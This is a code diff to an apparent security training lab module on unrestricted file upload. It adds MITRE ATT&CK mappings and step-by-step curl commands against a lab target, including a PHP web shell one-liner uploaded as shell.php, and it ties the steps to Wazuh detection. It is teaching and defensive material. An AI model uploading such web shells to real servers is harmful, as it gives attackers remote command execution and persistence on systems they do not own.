@@ -35,6 +35,14 @@ class FileUploadModule(BaseModule):
     category = Category.FILE
     scenario_id = "APP-04"
     severity = Severity.HIGH
+    # MITRE ATT&CK — drop a web-shell-style file via the public upload form.
+    mitre = {
+        "tactics": ["TA0001 Initial Access", "TA0003 Persistence"],
+        "techniques": [
+            {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
+            {"id": "T1505.003", "name": "Server Software Component: Web Shell", "tactic": "Persistence"},
+        ],
+    }
     lab = {
         "target_path": "/files/upload",
         "vulnerable_component": "Flask upload handler (files_bp.upload_file)",
@@ -43,18 +51,28 @@ class FileUploadModule(BaseModule):
             "validation. Uploaded files keep their original name and are "
             "served back from /static/uploads/. Prove that files with "
             "dangerous extensions are accepted and stored without restriction. "
-            "Note: uploaded files are NOT executed by this lab's server."
+            "Note: uploaded files are stored but NOT executed by this lab's server."
         ),
         "learner_steps": [
-            {"action": "Open the Upload page in the Lab Browser.",
-             "expected": "A file upload form with a drop zone is shown."},
-            {"action": "Upload a normal text file (.txt) to understand the flow.",
-             "expected": "Page reports the saved path — notice it keeps the original filename."},
-            {"action": "Create and upload a file with a dangerous extension (e.g. test.php).",
-             "expected": "The server accepts it with no extension or MIME validation."},
-            {"action": "Try uploading an HTML file with <script>alert('xss')</script> inside.",
-             "expected": "File is saved and accessible at /static/uploads/filename."},
+            {"action": "Recon the upload form — confirm the file field name.",
+             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
+             "command": "curl -s http://target-agent/files/upload | grep -o 'name=\"[^\"]*\"'",
+             "expected": "The form accepts a multipart field named 'file'."},
+            {"action": "Baseline with a benign text file to learn the response.",
+             "technique": "T1190 Exploit Public-Facing Application",
+             "command": "echo hello > note.txt; curl -s -F 'file=@note.txt' http://target-agent/files/upload | grep -i 'saved'",
+             "expected": "Page reports the saved path and keeps the original filename."},
+            {"action": "Upload a web-shell-style file with a dangerous extension.",
+             "technique": "T1505.003 Server Software Component: Web Shell",
+             "command": "printf '<?php echo shell_exec($_GET[\"cmd\"]); ?>' > shell.php; curl -s -F 'file=@shell.php' http://target-agent/files/upload",
+             "expected": "The server accepts shell.php with no extension or MIME validation."},
+            {"action": "Locate the stored file at its served URL.",
+             "technique": "T1505.003 Server Software Component: Web Shell",
+             "command": "curl -s -o /dev/null -w '%{http_code}\\n' http://target-agent/static/uploads/shell.php",
+             "expected": "The file is retrievable (HTTP 200). Note: this lab stores but does not execute it."},
             {"action": "Check the Evidence panel for Wazuh detections.",
+             "technique": "T1505.003 Server Software Component: Web Shell",
+             "command": "# review the activity log / Wazuh feed in ATTENSE",
              "expected": "Alert flagging the dangerous file extension."},
         ],
         "detection_rule": "Wazuh dangerous-upload signature (.php/.jsp/.exe extension)",
@@ -65,7 +83,20 @@ class FileUploadModule(BaseModule):
         ],
         "quick_probe": "/files/upload",
     }
-    steps = [{'title': 'Submit test files to /files/upload', 'hint': 'multipart/form-data with .php / .jsp extension', 'expected': '201/200 with saved filename echoed back'}, {'title': 'Locate the uploaded asset', 'hint': 'Target serves /static/uploads/ with autoindex on', 'expected': 'File retrievable via HTTP GET'}, {'title': 'Verify file is served as-is', 'hint': 'Check Content-Type, size, and that the file is actually served', 'expected': 'Dangerous extension accepted — unrestricted upload confirmed'}]
+    steps = [
+        {'title': 'Submit test files to /files/upload', 'tactic': 'Initial Access',
+         'technique': 'T1190 Exploit Public-Facing Application',
+         'command': "curl -s -F 'file=@shell.php' http://target-agent/files/upload",
+         'hint': 'multipart/form-data with .php / .jsp extension', 'expected': '201/200 with saved filename echoed back'},
+        {'title': 'Locate the uploaded asset', 'tactic': 'Persistence',
+         'technique': 'T1505.003 Server Software Component: Web Shell',
+         'command': "curl -s -o /dev/null -w '%{http_code}\\n' http://target-agent/static/uploads/shell.php",
+         'hint': 'Target serves /static/uploads/ with autoindex on', 'expected': 'File retrievable via HTTP GET'},
+        {'title': 'Verify file is served as-is', 'tactic': 'Persistence',
+         'technique': 'T1505.003 Server Software Component: Web Shell',
+         'command': "curl -sI http://target-agent/static/uploads/shell.php",
+         'hint': 'Check Content-Type, size, and that the file is actually served', 'expected': 'Dangerous extension accepted — unrestricted upload confirmed'},
+    ]
 
     def options(self) -> list[ModuleOption]:
         return [
@@ -82,6 +113,11 @@ class FileUploadModule(BaseModule):
         steps: list[StepResult] = []
         endpoint = opts.get("endpoint", "/files/upload")
         accepted = 0
+
+        # ── Recon (T1595.002): fetch the upload form first ──
+        self._log(log_fn, "Recon: fetching the upload form to confirm the field name...")
+        base = self._get(target.base_url + endpoint, label="recon-baseline", timeout=target.timeout)
+        steps.append(base)
 
         self._log(log_fn, f"Uploading {len(_PAYLOADS)} dangerous-extension files to {endpoint}")
 
